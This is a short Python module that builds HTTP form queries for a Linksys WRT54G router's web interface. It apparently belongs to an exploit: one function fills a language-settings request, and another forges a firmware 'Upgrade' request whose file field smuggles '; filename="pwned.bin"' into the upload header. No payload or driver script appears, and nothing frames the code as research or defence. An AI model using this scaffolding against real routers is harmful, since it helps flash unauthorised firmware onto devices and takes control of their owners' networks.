import ipaddress


def get_ui_language_query(ui_language, router_ip, router_netmask):
    router_iface = ipaddress.ip_interface(f'{router_ip}/{router_netmask}')
    _router_ip = ipaddress.ip_interface(f'{router_ip}/{router_netmask}')
    _router_netmask = router_iface.netmask
    return {
        "ui_language": ui_language,
        "lan_ipaddr_0": _router_ip.packed[0],
        "lan_ipaddr_1": _router_ip.packed[1],
        "lan_ipaddr_2": _router_ip.packed[2],
        "lan_ipaddr_3": _router_ip.packed[3],
        "lan_netmask": router_netmask,
        "submit_button": "index",
        "change_action": "gozila_cgi",
        "submit_type": "language",
        "action": "",
        "now_proto": "dhcp",
        "daylight_time": "0",
        "lan_ipaddr": "4",
        "wait_time": "0",
        "need_reboot": "0",
        "wan_proto": "dhcp",
        "router_name": "WRT54G",
        "wan_hostname": "",
        "wan_domain": "",
        "mtu_enable": "0",
        "lan_proto": "dhcp",
        "dhcp_check": "",
        "dhcp_start": "100",
        "dhcp_num": "50",
        "dhcp_lease": "0",
        "wan_dns": "4",
        "wan_dns0_0": "0",
        "wan_dns0_1": "0",
        "wan_dns0_2": "0",
        "wan_dns0_3": "0",
        "wan_dns1_0": "0",
        "wan_dns1_1": "0",
        "wan_dns1_2": "0",
        "wan_dns1_3": "0",
        "wan_dns2_0": "0",
        "wan_dns2_1": "0",
        "wan_dns2_2": "0",
        "wan_dns2_3": "0",
        "wan_wins": "4",
        "wan_wins_0": "0",
        "wan_wins_1": "0",
        "wan_wins_2": "0",
        "wan_wins_3": "0",
        "time_zone": "-08+1+1",
        "_daylight_time": "1",
    }


def get_upgrade_query():
    return {
        "file": '; filename="pwned.bin"',
        "submit_button": "Upgrade",
        "change_action": "",
        "action": "",
        "process": ""
    }
